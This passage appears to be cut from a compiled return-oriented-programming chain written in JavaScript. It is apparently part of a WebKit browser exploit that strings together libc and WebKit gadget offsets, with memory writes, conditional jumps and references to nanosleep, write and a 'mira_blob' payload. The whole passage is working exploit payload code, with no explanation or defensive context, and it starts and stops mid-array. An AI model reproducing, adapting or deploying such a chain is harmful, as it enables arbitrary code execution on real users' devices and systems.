db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
nanosleep_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+189304, //L2923
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2923:
db([0, 0]); // 0x0
//L2792:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
write_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190632, //L2924
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2924:
db([0, 0]); // 0x0
//_main:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+190704, //L2925
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2925:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190768, //L2927
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2927:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([2104, 0]); // 0x838
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190872, //L2930
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190920, //L2932
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2930:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2929:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2931:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2932:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191016, //L2934
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191000, //L2933
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2933:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2934:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2935:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2936:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2937:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2938:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2940:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+191328, //L2941
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2941:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2943:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2945:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+191520, //L2946
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2946:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2949:
db([4, 0]); // 0x4
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+191664, //L2950
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2950:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191776, //L2952
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2952:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2953:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L2954:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191904, //L2956
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191888, //L2955
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2955:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2956:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2957:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2959:
ropchain+192056, //L2958
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+216016, //L2960
//L2958:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+192144, //L2962
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2961:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2962:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2965:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+792472, //pop rcx
//L2966:
(window.mira_blob||0),
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2967:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+192328, //L2969
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192344, //L2970
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2969:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2970:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+192480, //L2975
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+192544, //L2977
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192512, //L2974
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+192528, //L2976
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2975:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2973:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2974:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2976:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2977:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+192656, //L2978+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+192648, //L2978
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2978:
db([0, 0]); // 0x0
set_gadgets([
ropchain+192672, //L2978+24
ropchain+198992, //L2972
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2980:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2981:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+192768, //L2983
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2982:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2983:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+192824, //L2986
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2986:
db([0, 0]); // 0x0
//L2984:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+192888, //L2988
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2987:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2988:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+192976, //L2990
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192992, //L2991
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2990:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2991:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+193144, //L2994
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193176, //L2996
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+193128, //L2993
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193160, //L2995
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2993:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2994:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2995:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2996:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193248, //L2997
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193264, //L2998
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2997:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2998:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193360, //L3000
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+193344, //L2999
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2999:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3000:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193440, //L3001
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3001:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3002:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L3003:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193592, //L3005
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193608, //L3006
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+193576, //L3004
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3004:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3005:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3006:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+193776, //L3008
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193792, //L3009
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193760, //L3007
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3007:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3008:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3009:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193896, //L3011
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193944, //L3014
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+193912, //L3012
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3011:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3012:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3013:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3014:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+194056, //L3015+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+194048, //L3015
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3015:
db([0, 0]); // 0x0
set_gadgets([
ropchain+194072, //L3015+24
ropchain+194088, //L3010
